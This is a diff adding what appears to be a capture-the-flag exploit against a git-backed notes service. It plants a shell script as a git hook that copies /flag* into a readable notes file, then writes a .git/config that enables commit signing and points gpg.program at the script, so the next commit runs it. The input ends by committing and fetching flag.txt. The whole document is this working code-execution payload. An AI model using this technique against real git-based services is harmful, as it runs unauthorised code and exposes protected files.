@@ -1,0 +1,20 @@
+a
+.git/hooks/pre-commit.sample
+#!/bin/sh
+cp /flag* /home/nobody/notes/flag.txt
+EOF
+a
+.git/config
+[user]
+  email = nobody@example.com
+  name = nobody
+[commit]
+  gpgsign = true
+[gpg]
+  program = /home/nobody/notes/.git/hooks/pre-commit.sample
+EOF
+a
+test
+EOF
+s
+flag.txt
